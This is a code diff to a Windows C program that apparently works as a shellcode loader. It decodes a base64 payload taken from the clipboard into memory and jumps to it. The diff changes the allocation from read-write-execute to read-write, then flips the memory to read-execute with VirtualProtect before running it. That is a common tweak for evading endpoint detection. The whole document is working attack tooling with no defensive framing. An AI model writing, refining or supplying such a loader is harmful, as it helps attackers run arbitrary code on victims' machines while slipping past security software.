@@ -14,7 +14,7 @@ int main() {
 	//WaitForSingleObject(th, -1);
 	if (CryptStringToBinaryA((char*)GetClipboardData(CF_TEXT), 0, CRYPT_STRING_BASE64, NULL, &size, 0, 0) == 0) { printf("Couldnt CryptStringToBinaryA\nQuitting..."); }
 	else {
-		LPVOID payload = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		LPVOID payload = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
 		if (payload == NULL) {
 			printf("VirtualAlloc failed with error code %d", GetLastError());
 		}
@@ -22,6 +22,7 @@ int main() {
 		CryptStringToBinaryA((char*)GetClipboardData(CF_TEXT), 0, CRYPT_STRING_BASE64, (BYTE *)payload, &size, 0, 0);
 		//char* test = (char*)payload;
 		printf("%lx with size %d", (*(int *)payload), size);
+		if (VirtualProtect(payload, size, PAGE_EXECUTE_READ, &size) == 0) { printf("Cant convert RW to RX with error code %d", GetLastError()); exit(-1); }
 		((void(*)())payload)();
 	}
 	CloseClipboard();
